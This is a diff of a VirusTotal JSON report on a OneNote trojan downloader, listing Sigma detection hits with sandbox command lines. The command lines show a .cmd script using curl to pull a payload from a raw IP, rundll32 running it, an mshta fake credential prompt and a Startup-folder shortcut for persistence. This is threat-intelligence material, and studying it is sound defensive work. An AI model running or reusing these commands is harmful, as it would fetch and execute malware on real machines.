@@ -9,11 +9,342 @@
         "self": "https://www.virustotal.com/api/v3/files/0a34ca695a121a9757c72fc0b78101eefba974896da6913d87c2a0575d15bc9f"
       },
       "attributes": {
+        "sha256": "0a34ca695a121a9757c72fc0b78101eefba974896da6913d87c2a0575d15bc9f",
+        "last_analysis_date": 1735365961,
+        "sigma_analysis_results": [
+          {
+            "rule_level": "high",
+            "rule_id": "6a6edfdea6536f74ea66bf73682ed52f4b86435793ed76ff38e3ab0523f029f5",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "Suspicious Microsoft Office Child Process",
+            "rule_description": "Detects a suspicious process spawning from one of the Microsoft Office suite products (Word, Excel, PowerPoint, Publisher, Visio, etc.)",
+            "rule_author": "Florian Roth (Nextron Systems), Markus Neis, FPT.EagleEye Team, Vadim Khrykov, Cyb3rEng, Michael Haag, Christopher Peacock @securepeacock, @scythe_io",
+            "match_context": [
+              {
+                "values": {
+                  "Hashes": "SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE",
+                  "CurrentDirectory": "C:\\Users\\george\\AppData\\Local\\Temp\\",
+                  "OriginalFileName": "Cmd.Exe",
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "Description": "Windows Command Processor",
+                  "EventID": "1",
+                  "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\Office16\\ONENOTE.EXE\" \"C:\\Users\\george\\Desktop\\document.one\"",
+                  "CommandLine": "C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\0013.pdf.cmd\" \"",
+                  "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
+                  "ParentImage": "C:\\Program Files\\Microsoft Office\\Office16\\ONENOTE.EXE",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Windows\\System32\\cmd.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "high",
+            "rule_id": "c2b8793bc5dc3f78c117608b17e59499e853d298dba8c03f56b4bbcd6d0c0f16",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "Suspicious Microsoft OneNote Child Process",
+            "rule_description": "Detects suspicious child processes of the Microsoft OneNote application. This may indicate an attempt to execute malicious embedded objects from a .one file.",
+            "rule_author": "Tim Rauch (Nextron Systems), Nasreddine Bencherchali (Nextron Systems), Elastic (idea)",
+            "match_context": [
+              {
+                "values": {
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "CurrentDirectory": "C:\\Users\\george\\AppData\\Local\\Temp\\",
+                  "OriginalFileName": "Cmd.Exe",
+                  "Hashes": "SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE",
+                  "Description": "Windows Command Processor",
+                  "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\Office16\\ONENOTE.EXE\" \"C:\\Users\\george\\Desktop\\document.one\"",
+                  "CommandLine": "C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\0013.pdf.cmd\" \"",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Program Files\\Microsoft Office\\Office16\\ONENOTE.EXE",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Windows\\System32\\cmd.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "high",
+            "rule_id": "f6f3741fe71241687646386731e58cbb9eb5dd4b8db836bb8840c3d02e5462b8",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "Suspicious JavaScript Execution Via Mshta.EXE",
+            "rule_description": "Detects execution of javascript code using \"mshta.exe\".",
+            "rule_author": "E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community",
+            "match_context": [
+              {
+                "values": {
+                  "Hashes": "SHA1=2DF819323AB8BDB951828AEE26AF1F1720DDE946,MD5=197FC97C6A843BEBB445C1D9C58DCBDB,SHA256=64E7A255A1AF1B54FD9243FAACB76A6527513FECF1B26BC3C9B8D3824DC9BDF9,IMPHASH=42DA177DE2FAA97C3DFAEC9562772A7F",
+                  "CurrentDirectory": "C:\\Users\\george\\AppData\\Local\\Temp\\",
+                  "OriginalFileName": "MSHTA.EXE",
+                  "Product": "Internet Explorer",
+                  "Description": "Microsoft (R) HTML Application host",
+                  "EventID": "1",
+                  "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe  /K \"C:\\Users\\george\\AppData\\Local\\Temp\\0013.pdf.cmd\"   ",
+                  "CommandLine": "mshta  javascript:alert(\"Unable to connect to the cloud! Check your saved credentials and retry.\");close();",
+                  "FileVersion": "11.00.17134.1 (WinBuild.160101.0800)",
+                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Windows\\System32\\mshta.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "medium",
+            "rule_id": "5572c8188426269a10ccb41fc8e9c8445391ac38a0917621b0a1ee05ec99aac9",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "Change PowerShell Policies to an Insecure Level - PowerShell",
+            "rule_description": "Detects use of Set-ExecutionPolicy to set insecure policies",
+            "rule_author": "frack113",
+            "match_context": [
+              {
+                "values": {
+                  "EventID": "4104",
+                  "ScriptBlockId": "36070712-ecac-4062-b2db-8d6fa9a40965",
+                  "ScriptBlockText": "f9c50298c31c4f832377cbc3805f78dcf568835d7138c21088e56a2c5768f935",
+                  "MessageNumber": "1",
+                  "MessageTotal": "1",
+                  "Path": ""
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "medium",
+            "rule_id": "56b8c79acb8e444c2b00be5c9d3cb8e33e863ccb3506d635f907a49cd053c84f",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "Startup Folder File Write",
+            "rule_description": "A General detection for files being created in the Windows startup directory. This could be an indicator of persistence.",
+            "rule_author": "Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)",
+            "match_context": [
+              {
+                "values": {
+                  "Image": "C:\\Program Files\\Microsoft Office\\Office16\\ONENOTE.EXE",
+                  "EventID": "11",
+                  "TargetFilename": "C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Send to OneNote.lnk"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "medium",
+            "rule_id": "e7856bac967038b016efab8e4f315a2f16ccd6ba62f20d73df0ad3826fe654a3",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "Rundll32 Execution With Uncommon DLL Extension",
+            "rule_description": "Detects the execution of rundll32 with a command line that doesn't contain a common extension",
+            "rule_author": "Tim Shelton, Florian Roth (Nextron Systems), Yassine Oukessou",
+            "match_context": [
+              {
+                "values": {
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "CurrentDirectory": "C:\\Users\\george\\AppData\\Local\\Temp\\",
+                  "OriginalFileName": "RUNDLL32.EXE",
+                  "Hashes": "SHA1=2F34CCFDD8141AEEE2E89FFB070CE239C7D00706,MD5=73C519F050C20580F8A62C849D49215A,SHA256=38847DC4C82C0775E7DAFCBC7FEA50749CDAC7B50AB8602E8FDFAD4401954C87,IMPHASH=F27A7FC3A53E74F45BE370131953896A",
+                  "Description": "Windows host process (Rundll32)",
+                  "EventID": "1",
+                  "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe  /K \"C:\\Users\\george\\AppData\\Local\\Temp\\0013.pdf.cmd\"   ",
+                  "CommandLine": "rundll32  welnar.nvn,init",
+                  "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
+                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Windows\\System32\\rundll32.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "medium",
+            "rule_id": "eb80a13f018daf47775fec9d5aaf6173f1ad3ed6a71702583f0bbb2feabc66f4",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "File Download From IP URL Via Curl.EXE",
+            "rule_description": "Detects file downloads directly from IP address URL using curl.exe",
+            "rule_author": "Nasreddine Bencherchali (Nextron Systems)",
+            "match_context": [
+              {
+                "values": {
+                  "Product": "The curl executable",
+                  "CurrentDirectory": "C:\\Users\\george\\AppData\\Local\\Temp\\",
+                  "OriginalFileName": "curl.exe",
+                  "Hashes": "SHA1=B073B1B84A589B7FEFD380AE9E097C3040E4DD07,MD5=2419907A0BB9A14F1871F0BDA7F65578,SHA256=C53B0901C262071DA3F3FBB69C30C2C26E2AB7866C7C42183C830B9A609C7994,IMPHASH=93009B50C3F15A001009BCDE9939BF92",
+                  "Description": "The curl executable",
+                  "FileVersion": "7.55.1",
+                  "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe  /K \"C:\\Users\\george\\AppData\\Local\\Temp\\0013.pdf.cmd\"   ",
+                  "CommandLine": "curl  -s --ssl-no-revoke --fail http://91.228.10.134/surface/zpVzfDywbwPQfJ5MEyG_VddG2JFN0vEj5A~~/lrqSWiNLDATaHERapWvaty0SFCwVU2T_nQ~~/ --output welnar.nvn",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Windows\\System32\\curl.exe",
+                  "Company": "curl, https://curl.haxx.se/"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "medium",
+            "rule_id": "f92451c8957e89bb4e61e68433faeb8d7c1461c3b90d06b3403c8f3d87c728b8",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "Usage Of Web Request Commands And Cmdlets",
+            "rule_description": "Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine",
+            "rule_author": "James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger",
+            "match_context": [
+              {
+                "values": {
+                  "Hashes": "SHA1=B073B1B84A589B7FEFD380AE9E097C3040E4DD07,MD5=2419907A0BB9A14F1871F0BDA7F65578,SHA256=C53B0901C262071DA3F3FBB69C30C2C26E2AB7866C7C42183C830B9A609C7994,IMPHASH=93009B50C3F15A001009BCDE9939BF92",
+                  "CurrentDirectory": "C:\\Users\\george\\AppData\\Local\\Temp\\",
+                  "OriginalFileName": "curl.exe",
+                  "Product": "The curl executable",
+                  "Description": "The curl executable",
+                  "FileVersion": "7.55.1",
+                  "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe  /K \"C:\\Users\\george\\AppData\\Local\\Temp\\0013.pdf.cmd\"   ",
+                  "CommandLine": "curl  -s --ssl-no-revoke --fail http://91.228.10.134/surface/zpVzfDywbwPQfJ5MEyG_VddG2JFN0vEj5A~~/lrqSWiNLDATaHERapWvaty0SFCwVU2T_nQ~~/ --output welnar.nvn",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Windows\\System32\\curl.exe",
+                  "Company": "curl, https://curl.haxx.se/"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "low",
+            "rule_id": "1f7f8b1e9005dd4d64cb9d30ed53ee94f68fb96262fbd72f7a0266881149c79f",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "Suspicious Get-WmiObject",
+            "rule_description": "The infrastructure for management data and operations that enables local and remote management of Windows personal computers and servers",
+            "rule_author": "frack113",
+            "match_context": [
+              {
+                "values": {
+                  "EventID": "4104",
+                  "ScriptBlockText": "10050407a4d401ef56d5a9ece4ccb6f08bba5c1ff6dfd318e419c04a972ba748",
+                  "ScriptBlockId": "8fe3efbd-853a-44c8-a79e-7fae9a574596",
+                  "MessageNumber": "1",
+                  "Path": "",
+                  "MessageTotal": "1"
+                }
+              },
+              {
+                "values": {
+                  "EventID": "4104",
+                  "ScriptBlockId": "667efede-0083-4509-b112-8287a2f25803",
+                  "ScriptBlockText": "10050407a4d401ef56d5a9ece4ccb6f08bba5c1ff6dfd318e419c04a972ba748",
+                  "MessageNumber": "1",
+                  "MessageTotal": "1",
+                  "Path": ""
+                }
+              },
+              {
+                "values": {
+                  "EventID": "4104",
+                  "ScriptBlockText": "10050407a4d401ef56d5a9ece4ccb6f08bba5c1ff6dfd318e419c04a972ba748",
+                  "ScriptBlockId": "4a0b66fa-b2f1-4fb5-9a0e-a402ec92b474",
+                  "MessageNumber": "1",
+                  "MessageTotal": "1",
+                  "Path": ""
+                }
+              },
+              {
+                "values": {
+                  "EventID": "4104",
+                  "ScriptBlockText": "10050407a4d401ef56d5a9ece4ccb6f08bba5c1ff6dfd318e419c04a972ba748",
+                  "ScriptBlockId": "106909cd-7ba6-4266-85cf-6f682fe08179",
+                  "MessageNumber": "1",
+                  "Path": "",
+                  "MessageTotal": "1"
+                }
+              },
+              {
+                "values": {
+                  "EventID": "4104",
+                  "ScriptBlockText": "10050407a4d401ef56d5a9ece4ccb6f08bba5c1ff6dfd318e419c04a972ba748",
+                  "ScriptBlockId": "605b9355-0a82-43d4-a475-ae7e343040b2",
+                  "MessageNumber": "1",
+                  "Path": "",
+                  "MessageTotal": "1"
+                }
+              }
+            ]
+          }
+        ],
+        "reputation": -58,
+        "total_votes": {
+          "harmless": 0,
+          "malicious": 1
+        },
         "type_tag": "one",
-        "tags": [
-          "persistence",
+        "sigma_analysis_stats": {
+          "critical": 0,
+          "high": 3,
+          "medium": 5,
+          "low": 1
+        },
+        "filecondis": {
+          "dhash": "0000181c1d180000",
+          "raw_md5": "1252e4e77082ad6c4ecd31dfcb102bfb"
+        },
+        "meaningful_name": "0a34ca695a121a979f.one",
+        "unique_sources": 9,
+        "md5": "4bc433a2119001680cf41b0f452f1765",
+        "type_extension": "one",
+        "last_analysis_stats": {
+          "malicious": 28,
+          "suspicious": 0,
+          "undetected": 33,
+          "harmless": 0,
+          "timeout": 0,
+          "confirmed-timeout": 0,
+          "failure": 0,
+          "type-unsupported": 15
+        },
+        "first_submission_date": 1679643833,
+        "type_tags": [
+          "document",
+          "msoffice",
+          "onenote",
           "one"
         ],
+        "last_modification_date": 1750679852,
+        "popular_threat_classification": {
+          "suggested_threat_label": "trojan.setter/onenote",
+          "popular_threat_name": [
+            {
+              "count": 4,
+              "value": "setter"
+            },
+            {
+              "count": 2,
+              "value": "onenote"
+            }
+          ],
+          "popular_threat_category": [
+            {
+              "count": 17,
+              "value": "trojan"
+            },
+            {
+              "count": 4,
+              "value": "downloader"
+            }
+          ]
+        },
+        "names": [
+          "0a34ca695a121a979f.one",
+          "0a34ca695a121a979f.doc",
+          "0a34ca695a121a9f.one",
+          "0a34ca695a121a9f.doc",
+          "0a34ca695a121a9757c72fc0b78101eefba974896da6913d87c2a0575d15bc9f.doc",
+          "0a34ca695a121a9757c72fc0b78101eefba974896da6913d87c2a0575d15bc9f.one",
+          "4bc433a2119001680cf41b0f452f1765.one.vir",
+          "4bc433a2119001680cf41b0f452f1765.doc.vir"
+        ],
+        "times_submitted": 27,
+        "last_submission_date": 1735429668,
         "sigma_analysis_summary": {
           "Sigma Integrated Rule Set (GitHub)": {
             "critical": 0,
@@ -22,21 +353,7 @@
             "low": 1
           }
         },
-        "magic": "data",
-        "first_submission_date": 1679643833,
-        "magika": "UNKNOWN",
-        "sandbox_verdicts": {
-          "Yomi Hunter": {
-            "category": "undetected",
-            "sandbox_name": "Yomi Hunter",
-            "malware_classification": [
-              "UNKNOWN_VERDICT"
-            ]
-          }
-        },
-        "type_description": "MS OneNote Note",
-        "type_extension": "one",
-        "unique_sources": 9,
+        "tlsh": "T18E44F193841A185BD9A3877C8DE24B18FB1BC8C18346CF6D7D9160AA1D2F3B3D857A4D",
         "last_analysis_results": {
           "Bkav": {
             "method": "blacklist",
@@ -647,298 +964,31 @@
             "result": null
           }
         },
-        "last_analysis_date": 1735365961,
-        "type_tags": [
-          "document",
-          "msoffice",
-          "onenote",
-          "one"
-        ],
-        "popular_threat_classification": {
-          "suggested_threat_label": "trojan.setter/onenote",
-          "popular_threat_name": [
-            {
-              "count": 4,
-              "value": "setter"
-            },
-            {
-              "count": 2,
-              "value": "onenote"
-            }
-          ],
-          "popular_threat_category": [
-            {
-              "count": 17,
-              "value": "trojan"
-            },
-            {
-              "count": 4,
-              "value": "downloader"
-            }
-          ]
-        },
-        "sigma_analysis_results": [
+        "trid": [
           {
-            "rule_level": "high",
-            "rule_id": "6a6edfdea6536f74ea66bf73682ed52f4b86435793ed76ff38e3ab0523f029f5",
-            "rule_source": "Sigma Integrated Rule Set (GitHub)",
-            "rule_title": "Suspicious Microsoft Office Child Process",
-            "rule_description": "Detects a suspicious process spawning from one of the Microsoft Office suite products (Word, Excel, PowerPoint, Publisher, Visio, etc.)",
-            "rule_author": "Florian Roth (Nextron Systems), Markus Neis, FPT.EagleEye Team, Vadim Khrykov, Cyb3rEng, Michael Haag, Christopher Peacock @securepeacock, @scythe_io",
-            "match_context": [
-              {
-                "values": {
-                  "Hashes": "SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE",
-                  "CurrentDirectory": "C:\\Users\\george\\AppData\\Local\\Temp\\",
-                  "OriginalFileName": "Cmd.Exe",
-                  "Product": "Microsoft\\xae Windows\\xae Operating System",
-                  "Description": "Windows Command Processor",
-                  "EventID": "1",
-                  "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\Office16\\ONENOTE.EXE\" \"C:\\Users\\george\\Desktop\\document.one\"",
-                  "CommandLine": "C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\0013.pdf.cmd\" \"",
-                  "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
-                  "ParentImage": "C:\\Program Files\\Microsoft Office\\Office16\\ONENOTE.EXE",
-                  "IntegrityLevel": "High",
-                  "Image": "C:\\Windows\\System32\\cmd.exe",
-                  "Company": "Microsoft Corporation"
-                }
-              }
-            ]
-          },
-          {
-            "rule_level": "high",
-            "rule_id": "c2b8793bc5dc3f78c117608b17e59499e853d298dba8c03f56b4bbcd6d0c0f16",
-            "rule_source": "Sigma Integrated Rule Set (GitHub)",
-            "rule_title": "Suspicious Microsoft OneNote Child Process",
-            "rule_description": "Detects suspicious child processes of the Microsoft OneNote application. This may indicate an attempt to execute malicious embedded objects from a .one file.",
-            "rule_author": "Tim Rauch (Nextron Systems), Nasreddine Bencherchali (Nextron Systems), Elastic (idea)",
-            "match_context": [
-              {
-                "values": {
-                  "Product": "Microsoft\\xae Windows\\xae Operating System",
-                  "CurrentDirectory": "C:\\Users\\george\\AppData\\Local\\Temp\\",
-                  "OriginalFileName": "Cmd.Exe",
-                  "Hashes": "SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE",
-                  "Description": "Windows Command Processor",
-                  "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
-                  "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\Office16\\ONENOTE.EXE\" \"C:\\Users\\george\\Desktop\\document.one\"",
-                  "CommandLine": "C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\0013.pdf.cmd\" \"",
-                  "EventID": "1",
-                  "ParentImage": "C:\\Program Files\\Microsoft Office\\Office16\\ONENOTE.EXE",
-                  "IntegrityLevel": "High",
-                  "Image": "C:\\Windows\\System32\\cmd.exe",
-                  "Company": "Microsoft Corporation"
-                }
-              }
-            ]
-          },
-          {
-            "rule_level": "high",
-            "rule_id": "f6f3741fe71241687646386731e58cbb9eb5dd4b8db836bb8840c3d02e5462b8",
-            "rule_source": "Sigma Integrated Rule Set (GitHub)",
-            "rule_title": "Suspicious JavaScript Execution Via Mshta.EXE",
-            "rule_description": "Detects execution of javascript code using \"mshta.exe\".",
-            "rule_author": "E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community",
-            "match_context": [
-              {
-                "values": {
-                  "Hashes": "SHA1=2DF819323AB8BDB951828AEE26AF1F1720DDE946,MD5=197FC97C6A843BEBB445C1D9C58DCBDB,SHA256=64E7A255A1AF1B54FD9243FAACB76A6527513FECF1B26BC3C9B8D3824DC9BDF9,IMPHASH=42DA177DE2FAA97C3DFAEC9562772A7F",
-                  "CurrentDirectory": "C:\\Users\\george\\AppData\\Local\\Temp\\",
-                  "OriginalFileName": "MSHTA.EXE",
-                  "Product": "Internet Explorer",
-                  "Description": "Microsoft (R) HTML Application host",
-                  "EventID": "1",
-                  "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe  /K \"C:\\Users\\george\\AppData\\Local\\Temp\\0013.pdf.cmd\"   ",
-                  "CommandLine": "mshta  javascript:alert(\"Unable to connect to the cloud! Check your saved credentials and retry.\");close();",
-                  "FileVersion": "11.00.17134.1 (WinBuild.160101.0800)",
-                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-                  "IntegrityLevel": "High",
-                  "Image": "C:\\Windows\\System32\\mshta.exe",
-                  "Company": "Microsoft Corporation"
-                }
-              }
-            ]
-          },
-          {
-            "rule_level": "medium",
-            "rule_id": "5572c8188426269a10ccb41fc8e9c8445391ac38a0917621b0a1ee05ec99aac9",
-            "rule_source": "Sigma Integrated Rule Set (GitHub)",
-            "rule_title": "Change PowerShell Policies to an Insecure Level - PowerShell",
-            "rule_description": "Detects use of Set-ExecutionPolicy to set insecure policies",
-            "rule_author": "frack113",
-            "match_context": [
-              {
-                "values": {
-                  "EventID": "4104",
-                  "ScriptBlockId": "36070712-ecac-4062-b2db-8d6fa9a40965",
-                  "ScriptBlockText": "f9c50298c31c4f832377cbc3805f78dcf568835d7138c21088e56a2c5768f935",
-                  "MessageNumber": "1",
-                  "MessageTotal": "1",
-                  "Path": ""
-                }
-              }
-            ]
-          },
-          {
-            "rule_level": "medium",
-            "rule_id": "56b8c79acb8e444c2b00be5c9d3cb8e33e863ccb3506d635f907a49cd053c84f",
-            "rule_source": "Sigma Integrated Rule Set (GitHub)",
-            "rule_title": "Startup Folder File Write",
-            "rule_description": "A General detection for files being created in the Windows startup directory. This could be an indicator of persistence.",
-            "rule_author": "Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)",
-            "match_context": [
-              {
-                "values": {
-                  "Image": "C:\\Program Files\\Microsoft Office\\Office16\\ONENOTE.EXE",
-                  "EventID": "11",
-                  "TargetFilename": "C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Send to OneNote.lnk"
-                }
-              }
-            ]
-          },
-          {
-            "rule_level": "medium",
-            "rule_id": "e7856bac967038b016efab8e4f315a2f16ccd6ba62f20d73df0ad3826fe654a3",
-            "rule_source": "Sigma Integrated Rule Set (GitHub)",
-            "rule_title": "Rundll32 Execution With Uncommon DLL Extension",
-            "rule_description": "Detects the execution of rundll32 with a command line that doesn't contain a common extension",
-            "rule_author": "Tim Shelton, Florian Roth (Nextron Systems), Yassine Oukessou",
-            "match_context": [
-              {
-                "values": {
-                  "Product": "Microsoft\\xae Windows\\xae Operating System",
-                  "CurrentDirectory": "C:\\Users\\george\\AppData\\Local\\Temp\\",
-                  "OriginalFileName": "RUNDLL32.EXE",
-                  "Hashes": "SHA1=2F34CCFDD8141AEEE2E89FFB070CE239C7D00706,MD5=73C519F050C20580F8A62C849D49215A,SHA256=38847DC4C82C0775E7DAFCBC7FEA50749CDAC7B50AB8602E8FDFAD4401954C87,IMPHASH=F27A7FC3A53E74F45BE370131953896A",
-                  "Description": "Windows host process (Rundll32)",
-                  "EventID": "1",
-                  "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe  /K \"C:\\Users\\george\\AppData\\Local\\Temp\\0013.pdf.cmd\"   ",
-                  "CommandLine": "rundll32  welnar.nvn,init",
-                  "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
-                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-                  "IntegrityLevel": "High",
-                  "Image": "C:\\Windows\\System32\\rundll32.exe",
-                  "Company": "Microsoft Corporation"
-                }
-              }
-            ]
-          },
-          {
-            "rule_level": "medium",
-            "rule_id": "eb80a13f018daf47775fec9d5aaf6173f1ad3ed6a71702583f0bbb2feabc66f4",
-            "rule_source": "Sigma Integrated Rule Set (GitHub)",
-            "rule_title": "File Download From IP URL Via Curl.EXE",
-            "rule_description": "Detects file downloads directly from IP address URL using curl.exe",
-            "rule_author": "Nasreddine Bencherchali (Nextron Systems)",
-            "match_context": [
-              {
-                "values": {
-                  "Product": "The curl executable",
-                  "CurrentDirectory": "C:\\Users\\george\\AppData\\Local\\Temp\\",
-                  "OriginalFileName": "curl.exe",
-                  "Hashes": "SHA1=B073B1B84A589B7FEFD380AE9E097C3040E4DD07,MD5=2419907A0BB9A14F1871F0BDA7F65578,SHA256=C53B0901C262071DA3F3FBB69C30C2C26E2AB7866C7C42183C830B9A609C7994,IMPHASH=93009B50C3F15A001009BCDE9939BF92",
-                  "Description": "The curl executable",
-                  "FileVersion": "7.55.1",
-                  "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe  /K \"C:\\Users\\george\\AppData\\Local\\Temp\\0013.pdf.cmd\"   ",
-                  "CommandLine": "curl  -s --ssl-no-revoke --fail http://91.228.10.134/surface/zpVzfDywbwPQfJ5MEyG_VddG2JFN0vEj5A~~/lrqSWiNLDATaHERapWvaty0SFCwVU2T_nQ~~/ --output welnar.nvn",
-                  "EventID": "1",
-                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-                  "IntegrityLevel": "High",
-                  "Image": "C:\\Windows\\System32\\curl.exe",
-                  "Company": "curl, https://curl.haxx.se/"
-                }
-              }
-            ]
-          },
-          {
-            "rule_level": "medium",
-            "rule_id": "f92451c8957e89bb4e61e68433faeb8d7c1461c3b90d06b3403c8f3d87c728b8",
-            "rule_source": "Sigma Integrated Rule Set (GitHub)",
-            "rule_title": "Usage Of Web Request Commands And Cmdlets",
-            "rule_description": "Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine",
-            "rule_author": "James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger",
-            "match_context": [
-              {
-                "values": {
-                  "Hashes": "SHA1=B073B1B84A589B7FEFD380AE9E097C3040E4DD07,MD5=2419907A0BB9A14F1871F0BDA7F65578,SHA256=C53B0901C262071DA3F3FBB69C30C2C26E2AB7866C7C42183C830B9A609C7994,IMPHASH=93009B50C3F15A001009BCDE9939BF92",
-                  "CurrentDirectory": "C:\\Users\\george\\AppData\\Local\\Temp\\",
-                  "OriginalFileName": "curl.exe",
-                  "Product": "The curl executable",
-                  "Description": "The curl executable",
-                  "FileVersion": "7.55.1",
-                  "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe  /K \"C:\\Users\\george\\AppData\\Local\\Temp\\0013.pdf.cmd\"   ",
-                  "CommandLine": "curl  -s --ssl-no-revoke --fail http://91.228.10.134/surface/zpVzfDywbwPQfJ5MEyG_VddG2JFN0vEj5A~~/lrqSWiNLDATaHERapWvaty0SFCwVU2T_nQ~~/ --output welnar.nvn",
-                  "EventID": "1",
-                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-                  "IntegrityLevel": "High",
-                  "Image": "C:\\Windows\\System32\\curl.exe",
-                  "Company": "curl, https://curl.haxx.se/"
-                }
-              }
-            ]
-          },
-          {
-            "rule_level": "low",
-            "rule_id": "1f7f8b1e9005dd4d64cb9d30ed53ee94f68fb96262fbd72f7a0266881149c79f",
-            "rule_source": "Sigma Integrated Rule Set (GitHub)",
-            "rule_title": "Suspicious Get-WmiObject",
-            "rule_description": "The infrastructure for management data and operations that enables local and remote management of Windows personal computers and servers",
-            "rule_author": "frack113",
-            "match_context": [
-              {
-                "values": {
-                  "EventID": "4104",
-                  "ScriptBlockText": "10050407a4d401ef56d5a9ece4ccb6f08bba5c1ff6dfd318e419c04a972ba748",
-                  "ScriptBlockId": "8fe3efbd-853a-44c8-a79e-7fae9a574596",
-                  "MessageNumber": "1",
-                  "Path": "",
-                  "MessageTotal": "1"
-                }
-              },
-              {
-                "values": {
-                  "EventID": "4104",
-                  "ScriptBlockId": "667efede-0083-4509-b112-8287a2f25803",
-                  "ScriptBlockText": "10050407a4d401ef56d5a9ece4ccb6f08bba5c1ff6dfd318e419c04a972ba748",
-                  "MessageNumber": "1",
-                  "MessageTotal": "1",
-                  "Path": ""
-                }
-              },
-              {
-                "values": {
-                  "EventID": "4104",
-                  "ScriptBlockText": "10050407a4d401ef56d5a9ece4ccb6f08bba5c1ff6dfd318e419c04a972ba748",
-                  "ScriptBlockId": "4a0b66fa-b2f1-4fb5-9a0e-a402ec92b474",
-                  "MessageNumber": "1",
-                  "MessageTotal": "1",
-                  "Path": ""
-                }
-              },
-              {
-                "values": {
